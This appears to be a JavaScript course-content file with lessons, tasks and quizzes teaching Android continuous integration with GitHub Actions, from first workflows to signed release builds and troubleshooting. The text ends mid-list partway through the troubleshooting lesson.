/*
 * All course content lives here. To add a lesson, push an object into a level's
 * `lessons` array. Note: inside template literals, GitHub Actions expressions
 * must be written as \${{ ... }} so JavaScript doesn't try to interpolate them.
 */
window.COURSE = {
  levels: [
    // =====================================================================
    {
      id: "beginner",
      title: "Beginner",
      tagline: "Understand CI and get your first green build.",
      color: "var(--l1)",
      lessons: [
        {
          id: "what-is-ci",
          title: "What is CI (and why Android teams need it)",
          minutes: 10,
          summary: "Continuous Integration means every change is automatically built and checked on a clean machine, so problems are caught in minutes instead of days.",
          body: `
<h2>The problem CI solves</h2>
<p>Without CI, a typical Android team hears these a lot: <em>"It builds on my machine"</em>, <em>"Who broke the tests?"</em>, <em>"The release APK crashes but debug was fine."</em> Each developer has a different JDK, SDK and Gradle cache, and nobody runs every check before pushing.</p>
<p><strong>Continuous Integration (CI)</strong> fixes this. Every time someone pushes code or opens a pull request, a server:</p>
<ol>
  <li>Checks out the code on a <strong>fresh, clean machine</strong>.</li>
  <li>Builds the app with the exact same tools every time.</li>
  <li>Runs checks: tests, lint, static analysis.</li>
  <li>Reports back: ✅ green (safe to merge) or ❌ red (something broke).</li>
</ol>

<h2>CI vs CD</h2>
<ul>
  <li><strong>Continuous Integration</strong> means automatically building and testing every change.</li>
  <li><strong>Continuous Delivery</strong> means every green build on the main branch <em>could</em> be released (for example, it's uploaded to testers).</li>
  <li><strong>Continuous Deployment</strong> means green builds are released to users automatically (for example, to a Play Store track).</li>
</ul>
<p>This course focuses on CI first, then grows into CD at the higher levels.</p>

<h2>Key vocabulary</h2>
<ul>
  <li><strong>Pipeline / workflow</strong>: the whole automated process.</li>
  <li><strong>Job</strong>: a group of steps that runs on one machine (a <em>runner</em>).</li>
  <li><strong>Step</strong>: one command or action, such as <code>./gradlew test</code>.</li>
  <li><strong>Trigger</strong>: the event that starts a pipeline, such as a push or a pull request.</li>
  <li><strong>Artifact</strong>: a file the pipeline produces and keeps, such as an APK or a test report.</li>
</ul>

<h2>Which CI tool?</h2>
<p>Popular choices for Android are <strong>GitHub Actions</strong>, GitLab CI, Bitrise, CircleCI and Jenkins. The concepts are the same everywhere. This course uses <strong>GitHub Actions</strong> because it's free for public repos, built into GitHub, and the most common choice today.</p>
<div class="callout tip">Learn the concepts, not just the YAML. Once you understand "checkout, set up the JDK, cache, build, test, upload", you can move to any CI tool in an afternoon.</div>
`,
          tasks: [
            "Write down 3 problems your team (or you) had that CI would have caught.",
            "Create a free GitHub account if you don't have one.",
          ],
          quiz: {
            q: "What is the main job of Continuous Integration?",
            options: [
              "Publish the app to the Play Store",
              "Automatically build and check every change on a clean machine",
              "Replace code reviews",
              "Make the app run faster on devices",
            ],
            answer: 1,
            explain: "CI is about fast, automatic feedback on every change. Publishing is CD, and CI supports code review rather than replacing it.",
          },
        },
        {
          id: "git-basics",
          title: "Git & branching for CI",
          minutes: 15,
          summary: "CI reacts to Git events. A simple branch + pull request workflow is the foundation of everything else.",
          body: `
<h2>The workflow CI is built around</h2>
<ol>
  <li><code>main</code> always holds working code.</li>
  <li>You create a <strong>feature branch</strong> for each change.</li>
  <li>You push it and open a <strong>Pull Request (PR)</strong>.</li>
  <li>CI runs on the PR. Reviewers look at the code <em>and</em> the CI result.</li>
  <li>When CI is green and the PR is approved, you merge into <code>main</code>.</li>
</ol>

<h2>Commands you'll use daily</h2>
<div class="code-block" data-lang="bash" data-label="terminal">git checkout -b feature/login-screen
# ...edit code...
git add .
git commit -m "Add login screen"
git push -u origin feature/login-screen
# then open a Pull Request on GitHub</div>

<h2>What must be in Git for CI to work</h2>
<p>CI only sees what's committed. Make sure these files <strong>are committed</strong>:</p>
<ul>
  <li><code>gradlew</code>, <code>gradlew.bat</code> and <code>gradle/wrapper/*</code> (the Gradle wrapper)</li>
  <li><code>settings.gradle.kts</code>, every <code>build.gradle.kts</code>, <code>gradle.properties</code></li>
  <li><code>gradle/libs.versions.toml</code> (if you use a version catalog)</li>
</ul>
<p>And these <strong>must NOT be committed</strong>:</p>
<ul>
  <li><code>local.properties</code> (it contains your machine's SDK path)</li>
  <li><code>*.jks</code> / <code>*.keystore</code> signing keys, API keys and passwords</li>
  <li><code>build/</code>, <code>.gradle/</code>, <code>.idea/</code> caches</li>
</ul>
<div class="code-block" data-lang="gitignore" data-label=".gitignore">*.iml
.gradle/
/local.properties
/.idea/
.DS_Store
/build
/captures
.externalNativeBuild
.cxx
*.jks
*.keystore</div>
<div class="callout warn">On Windows, <code>gradlew</code> can lose its "executable" bit. If CI fails with <code>Permission denied</code>, run <code>git update-index --chmod=+x gradlew</code> and commit.</div>
`,
          tasks: [
            "Create a new Android project in Android Studio (Empty Activity).",
            "Push it to a new GitHub repository.",
            "Check that local.properties is NOT on GitHub but gradlew IS.",
          ],
          quiz: {
            q: "Which file should NEVER be committed?",
            options: ["gradlew", "gradle/wrapper/gradle-wrapper.properties", "local.properties", "settings.gradle.kts"],
            answer: 2,
            explain: "local.properties holds machine-specific paths (and sometimes secrets). CI machines generate their own.",
          },
        },
        {
          id: "gradle-cli",
          title: "Building from the command line",
          minutes: 15,
          summary: "CI has no Android Studio. If you can build and test from the terminal, you can build and test in CI.",
          body: `
<h2>The Gradle wrapper is your best friend</h2>
<p><code>./gradlew</code> downloads the exact Gradle version your project needs, so every machine builds the same way. Never rely on a globally installed <code>gradle</code> in CI.</p>

<h2>Tasks you need to know</h2>
<div class="code-block" data-lang="bash" data-label="terminal">./gradlew tasks              # list available tasks
./gradlew assembleDebug      # build a debug APK
./gradlew assembleRelease    # build a release APK
./gradlew bundleRelease      # build an AAB (needed for Play Store)
./gradlew test               # run local unit tests (JVM)
./gradlew lint               # run Android Lint
./gradlew connectedAndroidTest  # run instrumented tests (needs device/emulator)
./gradlew clean              # delete build outputs</div>
<p>On Windows use <code>gradlew.bat</code> or <code>.\\gradlew</code> instead of <code>./gradlew</code>.</p>

<h2>Where are the outputs?</h2>
<ul>
  <li>APKs: <code>app/build/outputs/apk/debug/app-debug.apk</code></li>
  <li>AABs: <code>app/build/outputs/bundle/release/</code></li>
  <li>Unit test reports: <code>app/build/reports/tests/</code></li>
  <li>Lint reports: <code>app/build/reports/lint-results-debug.html</code></li>
</ul>

<h2>JDK version matters</h2>
<p>Modern Android Gradle Plugin (AGP) versions need <strong>JDK 17</strong> or newer. Android Studio ships its own JDK, but your terminal might use a different one. Check it with:</p>
<div class="code-block" data-lang="bash" data-label="terminal">./gradlew --version   # shows Gradle version AND the JVM it uses</div>
<div class="callout tip">Useful flags: <code>--stacktrace</code> (show error details), <code>--scan</code> (upload a detailed build report), <code>--offline</code>, and <code>-x lint</code> (skip a task).</div>
`,
          tasks: [
            "Run ./gradlew assembleDebug in your project and find the APK.",
            "Run ./gradlew test and open the HTML test report.",
            "Run ./gradlew --version and note your Gradle + JDK versions.",
          ],
          quiz: {
            q: "Which command produces the file you upload to Google Play?",
            options: ["./gradlew assembleDebug", "./gradlew bundleRelease", "./gradlew test", "./gradlew lint"],
            answer: 1,
            explain: "Google Play requires Android App Bundles (.aab), which bundleRelease produces.",
          },
        },
        {
          id: "first-workflow",
          title: "Your first GitHub Actions workflow",
          minutes: 20,
          summary: "Create one YAML file, push it, and get an APK built automatically on every push.",
          body: `
<h2>Where workflows live</h2>
<p>GitHub Actions runs any YAML file inside <code>.github/workflows/</code> in your repository. Create <code>.github/workflows/android-ci.yml</code>:</p>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/android-ci.yml">name: Android CI

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17

      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v4

      - name: Build debug APK
        run: ./gradlew assembleDebug</div>

<h2>Line by line</h2>
<ul>
  <li><code>on:</code> sets the triggers: pushes to <code>main</code>, and pull requests that target <code>main</code>.</li>
  <li><code>runs-on: ubuntu-latest</code> asks for a fresh Linux VM from GitHub. It comes with the Android SDK preinstalled.</li>
  <li><code>actions/checkout</code> clones your repo into the VM.</li>
  <li><code>actions/setup-java</code> installs JDK 17.</li>
  <li><code>gradle/actions/setup-gradle</code> configures Gradle and <strong>caching</strong> automatically.</li>
  <li><code>run:</code> is any shell command. Here it builds the debug APK.</li>
</ul>

<h2>Watch it run</h2>
<p>Commit and push the file, then open the <strong>Actions</strong> tab in your GitHub repo. Click the run to see live logs for every step.</p>
<div class="callout tip">Add a status badge to your README: <code>![CI](https://github.com/USER/REPO/actions/workflows/android-ci.yml/badge.svg)</code></div>
<div class="callout warn">Indentation is everything in YAML. Use spaces, never tabs. Most "weird" workflow errors are indentation errors.</div>
`,
          tasks: [
            "Add .github/workflows/android-ci.yml to your project and push.",
            "Watch the run in the Actions tab until it is green ✅.",
            "Break the build on purpose (add a syntax error) on a branch, open a PR, and watch CI go red ❌.",
            "Add the CI status badge to your README.",
          ],
          quiz: {
            q: "What does `runs-on: ubuntu-latest` mean?",
            options: [
              "The app will run on Ubuntu phones",
              "The job runs on a fresh GitHub-hosted Linux virtual machine",
              "You must install Ubuntu locally",
              "Only Linux users can trigger the workflow",
            ],
            answer: 1,
            explain: "Each job gets a brand-new hosted VM (the runner). Ubuntu runners include the Android SDK.",
          },
        },
      ],
    },

    // =====================================================================
    {
      id: "junior",
      title: "Junior",
      tagline: "Make CI actually catch bugs: tests, lint, caching, artifacts.",
      color: "var(--l2)",
      lessons: [
        {
          id: "unit-tests",
          title: "Running unit tests in CI",
          minutes: 20,
          summary: "A build that compiles isn't enough. Run your JVM unit tests on every PR and keep the reports.",
          body: `
<h2>Local unit tests vs instrumented tests</h2>
<ul>
  <li><strong>Local unit tests</strong> (<code>src/test</code>) run on the JVM. They're fast and cheap, so run them on <em>every</em> PR.</li>
  <li><strong>Instrumented tests</strong> (<code>src/androidTest</code>) need an emulator or device. They're slower, and you'll add them at the Mid level.</li>
</ul>

<h2>A tiny test to start with</h2>
<div class="code-block" data-lang="kotlin" data-label="app/src/test/java/.../PriceCalculatorTest.kt">class PriceCalculatorTest {
    @Test
    fun applyDiscount_reducesPrice() {
        val result = PriceCalculator().applyDiscount(price = 100.0, percent = 20)
        assertEquals(80.0, result, 0.001)
    }
}</div>

<h2>Add tests to the workflow</h2>
<div class="code-block" data-lang="yaml" data-label="steps (add after Set up Gradle)">      - name: Run unit tests
        run: ./gradlew testDebugUnitTest

      - name: Upload test reports
        if: always()          # upload even when tests fail!
        uses: actions/upload-artifact@v4
        with:
          name: unit-test-reports
          path: '**/build/reports/tests/'</div>
<p><code>if: always()</code> matters. Without it the upload step is skipped when tests fail, which is exactly when you need the report.</p>

<h2>Show results directly on the PR</h2>
<p>Downloading reports is clunky. A test-report action can post a summary of JUnit XML results on the run page:</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - name: Publish test results
        if: always()
        uses: mikepenz/action-junit-report@v5
        with:
          report_paths: '**/build/test-results/**/*.xml'</div>
<div class="callout tip">Run <code>testDebugUnitTest</code> rather than <code>test</code>. <code>test</code> runs every variant (debug AND release), which doubles the time for little extra value.</div>
`,
          tasks: [
            "Write at least 2 unit tests for real logic in your app.",
            "Add the test + upload-artifact steps to your workflow.",
            "Make a test fail on a branch and download the report from the run page.",
          ],
          quiz: {
            q: "Why use `if: always()` on the upload-report step?",
            options: [
              "It makes the step run faster",
              "So the report is uploaded even when the tests fail",
              "It's required for every step",
              "It runs the step on all operating systems",
            ],
            answer: 1,
            explain: "By default, steps after a failure are skipped. Reports are most valuable when tests fail.",
          },
        },
        {
          id: "lint-static-analysis",
          title: "Lint & static analysis",
          minutes: 20,
          summary: "Let machines catch style issues and common bugs so code reviews can focus on logic.",
          body: `
<h2>Three tools you'll see everywhere</h2>
<ul>
  <li><strong>Android Lint</strong> is built into AGP. It catches Android-specific issues: missing permissions, API level problems, hardcoded strings, and more.</li>
  <li><strong>ktlint</strong> enforces Kotlin code style (formatting).</li>
  <li><strong>detekt</strong> finds code smells: functions that are too complex or too long, potential bugs.</li>
</ul>

<h2>Make Lint fail the build</h2>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">android {
    lint {
        abortOnError = true
        warningsAsErrors = false
        checkDependencies = true
        // Existing project with many warnings? Start with a baseline:
        baseline = file("lint-baseline.xml")
    }
}</div>
<p>A <strong>baseline</strong> records all existing issues so CI only fails on <em>new</em> ones. Generate it with <code>./gradlew updateLintBaseline</code>. This is how you add Lint to an old project without fixing 500 warnings on day one.</p>

<h2>Add detekt</h2>
<div class="code-block" data-lang="kotlin" data-label="build.gradle.kts (root)">plugins {
    id("io.gitlab.arturbosch.detekt") version "1.23.8"
}</div>

<h2>Run them in a separate job</h2>
<p>Jobs run <strong>in parallel</strong> by default, so splitting lint from tests makes CI faster and the failure reason clearer.</p>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/android-ci.yml">jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4
      - run: ./gradlew lintDebug detekt
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: lint-reports
          path: '**/build/reports/'

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4
      - run: ./gradlew testDebugUnitTest</div>
`,
          tasks: [
            "Enable abortOnError for Lint and create a lint baseline.",
            "Add detekt (or ktlint) to your project and run it locally.",
            "Split your workflow into separate lint and test jobs.",
          ],
          quiz: {
            q: "What does a lint baseline do?",
            options: [
              "Deletes all lint warnings",
              "Records existing issues so CI only fails on new ones",
              "Makes lint run faster",
              "Disables lint in CI",
            ],
            answer: 1,
            explain: "Baselines let you adopt strict checks on legacy code without having to fix everything first.",
          },
        },
        {
          id: "caching",
          title: "Caching: make CI fast",
          minutes: 15,
          summary: "Downloading dependencies and Gradle every run wastes minutes. Caching brings a 10-minute build down to 3.",
          body: `
<h2>What's worth caching</h2>
<ul>
  <li><strong>Gradle distribution</strong> (the wrapper download)</li>
  <li><strong>Dependency jars</strong> in <code>~/.gradle/caches</code></li>
  <li><strong>Build cache</strong>: outputs of tasks that didn't change</li>
</ul>

<h2>The easy way: setup-gradle</h2>
<p>You already use <code>gradle/actions/setup-gradle</code>, and it caches all of the above automatically. By default it only <em>writes</em> the cache from your default branch (<code>main</code>). PR branches <em>read</em> it, which keeps the cache from filling up with junk.</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - uses: gradle/actions/setup-gradle@v4
        with:
          # only main writes to the cache (this is the default; shown for clarity)
          cache-read-only: \${{ github.ref != 'refs/heads/main' }}</div>

<h2>Turn on Gradle's own speedups</h2>
<div class="code-block" data-lang="properties" data-label="gradle.properties">org.gradle.caching=true
org.gradle.parallel=true
org.gradle.configuration-cache=true
org.gradle.jvmargs=-Xmx4g -XX:+UseParallelGC -Dfile.encoding=UTF-8</div>

<h2>Measure, don't guess</h2>
<p>Compare the duration of a run before and after enabling caching. The second run on <code>main</code> should be noticeably faster. Look for <code>FROM-CACHE</code> and <code>UP-TO-DATE</code> next to task names in the logs (run with <code>--console=plain</code> to see them clearly).</p>
<div class="callout warn">Don't hand-roll <code>actions/cache</code> for <code>~/.gradle</code> on top of setup-gradle. Two caches fight each other and slow things down.</div>
`,
          tasks: [
            "Record your current CI duration.",
            "Enable org.gradle.caching and configuration-cache in gradle.properties.",
            "Run CI twice on main and compare durations.",
          ],
          quiz: {
            q: "Why should PR branches usually only READ the Gradle cache?",
            options: [
              "Writing is not allowed on PRs",
              "To avoid filling the cache with short-lived, branch-specific entries",
              "Reading is faster than writing",
              "Caches only work on main",
            ],
            answer: 1,
            explain: "GitHub cache storage is limited (10 GB per repo by default). Letting main own the cache keeps hits high and evictions low.",
          },
        },
        {
          id: "artifacts-triggers",
          title: "Artifacts, triggers & protecting main",
          minutes: 20,
          summary: "Keep the APK from each build, control when workflows run, and make green CI mandatory before merging.",
          body: `
<h2>Upload the APK</h2>
<div class="code-block" data-lang="yaml" data-label="steps">      - run: ./gradlew assembleDebug
      - uses: actions/upload-artifact@v4
        with:
          name: app-debug-\${{ github.sha }}
          path: app/build/outputs/apk/debug/*.apk
          retention-days: 7</div>
<p>Testers and reviewers can now download the exact APK for any PR from the run page.</p>

<h2>Smarter triggers</h2>
<div class="code-block" data-lang="yaml" data-label="on:">on:
  pull_request:
    paths-ignore:          # don't build for docs-only changes
      - '**.md'
      - 'docs/**'
  push:
    branches: [ main ]
  workflow_dispatch:       # adds a "Run workflow" button for manual runs

concurrency:               # cancel old runs when a PR gets a new push
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true</div>
<p><code>concurrency</code> is one of the cheapest wins there is. If you push 3 commits quickly, only the last one keeps running.</p>

<h2>Branch protection: make CI mandatory</h2>
<p>CI that people can ignore is just a suggestion. In GitHub, go to <strong>Settings → Branches → Add rule</strong> (or <em>Rulesets</em>) for <code>main</code>:</p>
<ul>
  <li>✅ Require a pull request before merging</li>
  <li>✅ Require status checks to pass, then select your <code>lint</code> and <code>test</code> jobs</li>
  <li>✅ Require branches to be up to date before merging</li>
</ul>
<div class="callout tip">🎓 <strong>Junior milestone:</strong> every PR is now built, tested and linted, CI is fast because of caching, and nobody can merge red code. That's a real, professional CI setup.</div>
`,
          tasks: [
            "Upload the debug APK as an artifact and install it on your phone.",
            "Add concurrency + paths-ignore to your workflow.",
            "Enable branch protection on main with required status checks.",
          ],
          quiz: {
            q: "What does `concurrency` with `cancel-in-progress: true` do?",
            options: [
              "Runs all jobs at the same time",
              "Cancels older runs for the same branch when a new one starts",
              "Prevents two people from pushing at once",
              "Limits CI to one run per day",
            ],
            answer: 1,
            explain: "It saves CI minutes by killing outdated runs for the same workflow and ref.",
          },
        },
      ],
    },

    // =====================================================================
    {
      id: "mid",
      title: "Mid-level",
      tagline: "Emulator tests, signed releases, secrets and tester distribution.",
      color: "var(--l3)",
      lessons: [
        {
          id: "instrumented-tests",
          title: "Instrumented tests on an emulator",
          minutes: 25,
          summary: "Run Espresso/Compose UI tests on a real Android emulator inside CI.",
          body: `
<h2>The standard approach</h2>
<p>The community action <code>reactivecircus/android-emulator-runner</code> boots an emulator and runs your command once it's ready. Linux runners support hardware acceleration (KVM), but you have to enable it:</p>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/android-ci.yml">  instrumented-tests:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4

      - name: Enable KVM
        run: |
          echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
          sudo udevadm control --reload-rules
          sudo udevadm trigger --name-match=kvm

      - name: Run instrumented tests
        uses: reactivecircus/android-emulator-runner@v2
        with:
          api-level: 34
          arch: x86_64
          target: google_apis
          disable-animations: true
          script: ./gradlew connectedDebugAndroidTest

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: androidTest-reports
          path: '**/build/reports/androidTests/'</div>

<h2>Alternative: Gradle Managed Devices</h2>
<p>AGP can create and manage emulators for you, configured in Gradle, so the same command works locally and in CI:</p>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">android {
    testOptions {
        managedDevices {
            localDevices {
                create("pixel6api34") {
                    device = "Pixel 6"
                    apiLevel = 34
                    systemImageSource = "aosp-atd"   // slim, test-optimized image
                }
            }
        }
    }
}
// run with: ./gradlew pixel6api34DebugAndroidTest</div>

<h2>Keep UI tests reliable</h2>
<ul>
  <li>Disable animations (the action does this for you).</li>
  <li>Never use <code>Thread.sleep</code>. Use Espresso idling resources or Compose <code>waitUntil</code>.</li>
  <li>Fake the network (for example with MockWebServer) instead of hitting real servers.</li>
  <li>Run heavy UI suites on <code>main</code> or nightly if they're too slow for every PR.</li>
</ul>
<div class="callout warn">Emulator jobs are the slowest and flakiest part of Android CI. Keep the instrumented suite small and focused, and push as much logic as possible into fast JVM unit tests.</div>
`,
          tasks: [
            "Write one Espresso or Compose UI test.",
            "Add the instrumented-tests job and get it green.",
            "Try Gradle Managed Devices locally.",
          ],
          quiz: {
            q: "Why enable KVM on the Linux runner?",
            options: [
              "To allow Docker",
              "So the emulator can use hardware acceleration and run much faster",
              "It's needed for Gradle caching",
              "To support Windows apps",
            ],
            answer: 1,
            explain: "Without hardware acceleration, x86 emulators are painfully slow or don't boot at all.",
          },
        },
        {
          id: "secrets-signing",
          title: "Secrets & signing release builds",
          minutes: 25,
          summary: "Build a signed release AAB in CI without ever committing your keystore or passwords.",
          body: `
<h2>Rule #1: secrets never go in Git</h2>
<p>Your keystore and passwords live in <strong>GitHub Secrets</strong> (<em>Settings → Secrets and variables → Actions</em>). They're encrypted and masked in logs.</p>

<h2>Step 1: store the keystore as base64</h2>
<p>Secrets are text, so encode the binary keystore file:</p>
<div class="code-block" data-lang="bash" data-label="terminal">base64 -w 0 release.jks > release.jks.b64        # Linux
base64 -i release.jks -o release.jks.b64         # macOS
# PowerShell:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("release.jks")) > release.jks.b64</div>
<p>Create these repository secrets: <code>KEYSTORE_BASE64</code>, <code>KEYSTORE_PASSWORD</code>, <code>KEY_ALIAS</code>, <code>KEY_PASSWORD</code>.</p>

<h2>Step 2: read signing config from environment variables</h2>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">android {
    signingConfigs {
        create("release") {
            val ksPath = System.getenv("KEYSTORE_PATH")
            if (ksPath != null) {
                storeFile = file(ksPath)
                storePassword = System.getenv("KEYSTORE_PASSWORD")
                keyAlias = System.getenv("KEY_ALIAS")
                keyPassword = System.getenv("KEY_PASSWORD")
            }
        }
    }
    buildTypes {
        release {
            isMinifyEnabled = true
            signingConfig = signingConfigs.getByName("release")
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }
}</div>

<h2>Step 3: decode and build in CI</h2>
<div class="code-block" data-lang="yaml" data-label=".github/workflows/release.yml">name: Release build
on:
  push:
    tags: [ 'v*' ]        # runs when you push a tag like v1.2.0

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4

      - name: Decode keystore
        run: echo "\${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > \${{ runner.temp }}/release.jks

      - name: Build signed AAB
        env:
          KEYSTORE_PATH: \${{ runner.temp }}/release.jks
          KEYSTORE_PASSWORD: \${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: \${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: \${{ secrets.KEY_PASSWORD }}
        run: ./gradlew bundleRelease

      - uses: actions/upload-artifact@v4
        with:
          name: release-aab
          path: app/build/outputs/bundle/release/*.aab</div>
<div class="callout warn">Secrets are <strong>not</strong> available to workflows triggered by pull requests from forks, which is good for security. Keep signing in separate workflows that run on tags or <code>main</code>, not on PRs.</div>
<div class="callout tip">With <strong>Play App Signing</strong>, the key you use in CI is only an <em>upload key</em>. If it ever leaks, Google can reset it. Always enroll.</div>
`,
          tasks: [
            "Create an upload keystore (Build → Generate Signed Bundle in Android Studio).",
            "Add the 4 secrets to your GitHub repo.",
            "Create release.yml, push a tag (git tag v0.1.0 && git push --tags) and download the signed AAB.",
          ],
          quiz: {
            q: "How should a keystore be provided to CI?",
            options: [
              "Commit it to a private repo",
              "Store it base64-encoded in an encrypted CI secret and decode it at build time",
              "Email it to the CI server",
              "Put it in gradle.properties",
            ],
            answer: 1,
            explain: "Encrypted secrets keep the key out of Git history, and they're masked in logs.",
          },
        },
        {
          id: "variants-matrix",
          title: "Build variants, matrix & versioning",
          minutes: 20,
          summary: "Build multiple flavors in parallel and give every CI build a unique, traceable version.",
          body: `
<h2>Matrix builds</h2>
<p>A <strong>matrix</strong> runs the same job with different inputs in parallel. It's great for product flavors or different API levels:</p>
<div class="code-block" data-lang="yaml" data-label="job">  build:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false          # let other flavors finish if one fails
      matrix:
        flavor: [ free, paid ]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: gradle/actions/setup-gradle@v4
      - run: ./gradlew assemble\${{ matrix.flavor }}Debug</div>
<p>Gradle task names are case-insensitive for the first letter of each part, so <code>assemblefreeDebug</code> works. You can also use <code>include:</code> to set exact task names.</p>

<h2>Automatic version codes</h2>
<p>Every build uploaded to Play needs a higher <code>versionCode</code>. Let CI generate it:</p>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">android {
    defaultConfig {
        versionCode = System.getenv("GITHUB_RUN_NUMBER")?.toInt()?.plus(1000) ?: 1
        versionName = System.getenv("VERSION_NAME") ?: "0.0.1-local"
    }
}</div>
<div class="code-block" data-lang="yaml" data-label="steps">      - name: Build
        env:
          VERSION_NAME: \${{ github.ref_name }}   # e.g. v1.4.0 when triggered by a tag
        run: ./gradlew bundleRelease</div>
<div class="callout tip">Add an offset (like +1000) so CI numbers never collide with versions you already published manually.</div>

<h2>Traceability</h2>
<p>Inject the commit SHA so crash reports tell you exactly which code is running:</p>
<div class="code-block" data-lang="kotlin" data-label="app/build.gradle.kts">android {
    buildFeatures { buildConfig = true }
    defaultConfig {
        buildConfigField("String", "GIT_SHA", "\\"\${System.getenv("GITHUB_SHA")?.take(7) ?: "local"}\\"")
    }
}</div>
`,
          tasks: [
            "Add a product flavor (or two API levels) and build them with a matrix.",
            "Generate versionCode from GITHUB_RUN_NUMBER.",
            "Show BuildConfig.GIT_SHA on a debug/about screen.",
          ],
          quiz: {
            q: "What does `fail-fast: false` do in a matrix?",
            options: [
              "Makes builds fail faster",
              "Lets other matrix jobs keep running even if one fails",
              "Disables the matrix",
              "Retries failed jobs",
            ],
            answer: 1,
            explain: "By default, one failing matrix job cancels the others. fail-fast: false lets you see every result.",
          },
        },
        {
          id: "troubleshooting",
          title: "Troubleshooting common CI failures",
          minutes: 30,
          summary: "Pipelines break all the time. Learn the usual suspects and a systematic way to debug a red build.",
          body: `
<h2>A systematic approach</h2>
<ol>
  <li><strong>Read the first error, not the last one.</strong> Scroll up to the first <code>FAILURE</code> or <code>error:</code>. Everything after it is usually noise.</li>
  <li><strong>Does it fail locally?</strong> Run the exact same Gradle command. If it passes locally, the difference is the environment.</li>
  <li><strong>Did it ever pass?</strong> Compare with the last green run: what changed (code, dependencies, runner image, action versions)?</li>
  <li><strong>Get more information</strong>, then form <em>one</em> hypothesis and test it.</li>
</ol>

<h2>The usual suspects</h2>
<h3>❌ <code>./gradlew: Permission denied</code></h3>
<p>The executable bit was lost (common when committing from Windows). Fix it once:</p>
<div class="code-block" data-lang="bash" data-label="terminal">git update-index --chmod=+x gradlew
git commit -m "Make gradlew executable"</div>

<h3>❌ <code>Android Gradle plugin requires Java 17 to run</code></h3>
<p>The JDK on the runner doesn't match what AGP needs. Pin it with <code>actions/setup-java</code> and use the same version locally (Android Studio → Settings → Build Tools → Gradle → Gradle JDK).</p>

<h3>❌ <code>Gradle build daemon disappeared</code> / <code>OutOfMemoryError</code> / <code>Metaspace</code></h3>
<p>The build ran out of memory. GitHub's standard Linux runners have 16 GB RAM, but Gradle, the Kotlin daemon and the emulator all compete for it.</p>
<div class="code-block" data-lang="properties" data-label="gradle.properties">org.gradle.jvmargs=-Xmx4g -XX:MaxMetaspaceSize=1g -XX:+UseParallelGC
kotlin.daemon.jvmargs=-Xmx2g</div>

<h3>❌ <code>No space left on device</code></h3>
<p>Runners have limited disk, and emulator images plus caches add up. Delete preinstalled tools you don't need at the start of the job:</p>
<div class="code-block" data-lang="yaml" data-label="steps">      - name: Free disk space
        run: |
          sudo rm -rf /usr/share/dotnet /opt/ghc /usr/local/share/boost
          df -h</div>

<h3>❌ <code>Failed to install the following SDK components</code> / licenses not accepted</h3>
<div class="code-block" data-lang="bash" data-label="steps">yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses</div>

<h3>❌ Secrets are empty</h3>
<ul>
  <li>The run came from a <strong>fork's pull request</strong>: secrets are intentionally not passed.</li>
  <li>A typo in the secret name. <code>secrets.X</code> returns an empty string instead of an error.</li>
  <li>The secret belongs to an <strong>Environment</strong>, but the job doesn't declare <code>environment:</code>.</li>
</ul>

<h3>❌ Emulator never boots / test run times out</h3>
<ul>
  <li>KVM isn't enabled (see the instrumented tests lesson).</li>
  <li>The system image is too heavy. Try <code>target: aosp_atd</code> or <code>google_apis</code>, and an API level with good emulator support.</li>
  <li>Always set <code>timeout-minutes</code> so a stuck job fails in 30 minutes, not after the 6-hour default.</li>
</ul>

<h3>❌ "Passes on my machine, fails in CI"</h3>
<p>Typical environment differences:</p>
<ul>
  <li><strong>Time zone & locale</strong>: CI runs in UTC with an English locale. Tests that format dates or currency break.</li>
  <li><strong>File system case sensitivity</strong>: Linux is case-sensitive, while Windows and macOS usually aren't. <code>Logo.png</code> ≠ <code>logo.png</code>.</li>
  <li><strong>Uncommitted files</strong> such as a generated file or a <code>google-services.json</code> that only exists locally.</li>
  <li><strong>Test order</strong>: tests that depend on shared state pass alone but fail together.</li>
  <li><strong>Stale cache</strong>: rarely, a corrupted cache. Delete it in <em>Actions → Caches</em> and re-run.</li>
</ul>

<h2>Tools to get more information</h2>
<ul>
